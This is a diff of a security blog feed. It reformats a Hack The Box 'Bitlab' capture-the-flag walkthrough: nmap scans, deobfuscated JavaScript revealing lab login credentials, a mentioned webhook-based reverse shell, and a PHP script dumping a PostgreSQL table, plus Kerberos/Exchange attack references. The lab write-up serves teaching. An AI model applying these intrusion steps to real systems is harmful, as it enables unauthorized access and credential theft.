 &lt;h2 id="references">References&lt;/h2>
 &lt;p>&lt;strong>AS-REP Roasting&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html" target="_blank" rel="noopener">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec" target="_blank" rel="noopener">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/" target="_blank" rel="noopener">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>
+&lt;/p>
 &lt;p>&lt;strong>Exchange and ACL Stuff&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed" target="_blank" rel="noopener">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/" target="_blank" rel="noopener">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md" target="_blank" rel="noopener">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>
+&lt;/p>
 &lt;p>&lt;strong>Other Forest Walkthroughs&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>&lt;/p></content></item><item><title>Hack The Box: Bitlab</title><link>https://blog.ikuamike.io/posts/2020/bitlab-htb/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/bitlab-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/bitlab/info_card.png" alt="Bastion Info Card" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=3755s&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/" target="_blank" rel="noopener">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>
+&lt;/p></content></item><item><title>Hack The Box: Bitlab</title><link>https://blog.ikuamike.io/posts/2020/bitlab-htb/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/bitlab-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/bitlab/info_card.png" alt="Bastion Info Card" class="center" style="border-radius: 8px;" />
 &lt;h1 id="summary">Summary&lt;/h1>
 &lt;p>As the name suggests this box had a instance of gitlab where the initial foothold involves getting credentials from obfuscated javascript and once logged into the gitlab instance we abuse webhooks to add our own code and execute it to get a reverse shell. Read on to see how I able to root the box.&lt;/p>
 &lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;p>As usual I start with a quick nmap scan to find open ports and then run a second scan for service and version detection.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.114
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.21s latency&lt;span style="color:#f92672">)&lt;/span>.
-Not shown: &lt;span style="color:#ae81ff">65533&lt;/span> filtered ports
-PORT STATE SERVICE
-22/tcp open ssh
-80/tcp open http
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thorough scan:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.47s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http nginx
-| http-robots.txt: &lt;span style="color:#ae81ff">55&lt;/span> disallowed entries &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> shown&lt;span style="color:#f92672">)&lt;/span>
-| / /autocomplete/users /search /api /admin /profile
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help
-|_/s/ /snippets/new /snippets/*/edit
-|_http-server-header: nginx
-| http-title: Sign in &lt;span style="color:#ae81ff">\x&lt;/span>C2&lt;span style="color:#ae81ff">\x&lt;/span>B7 GitLab
-|_Requested resource was http://10.10.10.114/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gitlab">Gitlab&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.21s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">65533&lt;/span> filtered ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thorough scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.47s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#ae81ff">55&lt;/span> disallowed entries &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> shown&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| / /autocomplete/users /search /api /admin /profile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/s/ /snippets/new /snippets/*/edit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-title: Sign in &lt;span style="color:#ae81ff">\x&lt;/span>C2&lt;span style="color:#ae81ff">\x&lt;/span>B7 GitLab
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_Requested resource was http://10.10.10.114/users/sign_in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-trane-info: Problem with XML parsing of /evox/about
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gitlab">Gitlab&lt;/h2>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-01.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After trying out some simple combinations of username and password that didn&amp;rsquo;t work I decided to click on links on the home page and see if I&amp;rsquo;ll get a version number. When I opened the help link I got this.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-02.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
@@ -295,13 +314,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-03.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;!-- raw HTML omitted -->
 &lt;p>The deobfuscated javascript shows a username and password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">javascript&lt;/span>&lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#66d9ef">function&lt;/span> ()
-{
-&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getElementById&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clave&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_password&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;11des0081x&amp;#34;&lt;/span>];
-document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>];
-document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>];
-})()
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>After logging in there are two projects.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">javascript&lt;/span>&lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#66d9ef">function&lt;/span> ()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getElementById&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clave&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_password&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;11des0081x&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After logging in there are two projects.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-04.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>My user has Developer role on the Profile repo and Reporter role on the Deployer repo. I can&amp;rsquo;t edit the deployer but looking at the files the readme has a link about gitlab webhooks.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-05.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
@@ -325,42 +344,49 @@ document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:
 &lt;p>Checking on the server we indeed have a postgresql instance running locally on port 5432.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-13.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After some tweaking I was able to get a script working that would read the db.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-$host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span>;
-$port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;port = 5432&amp;#34;&lt;/span>;
-$dbname &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dbname = profiles&amp;#34;&lt;/span>;
-$credentials &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span>;
-$db &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_connect&lt;/span>( &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">$host&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$port&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$dbname&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$credentials&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> );
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$db) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Error : Unable to open database&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-} &lt;span style="color:#66d9ef">else&lt;/span> {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Opened database successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-}
-$sql &lt;span style="color:#f92672">=&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">EOF&lt;/span>
-&lt;span style="color:#a6e22e">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">from&lt;/span> &lt;span style="color:#a6e22e">profiles&lt;/span>;
-&lt;span style="color:#a6e22e">EOF&lt;/span>;
-$ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_query&lt;/span>($db, $sql);
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$ret) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">pg_last_error&lt;/span>($db);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">while&lt;/span>($row &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_fetch_row&lt;/span>($ret)) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-}
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Operation done successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#a6e22e">pg_close&lt;/span>($db);
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;port = 5432&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $dbname &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dbname = profiles&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $credentials &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $db &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_connect&lt;/span>( &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">$host&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$port&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$dbname&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$credentials&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$db) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Error : Unable to open database&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Opened database successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sql &lt;span style="color:#f92672">=&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">from&lt;/span> &lt;span style="color:#a6e22e">profiles&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">EOF&lt;/span>;
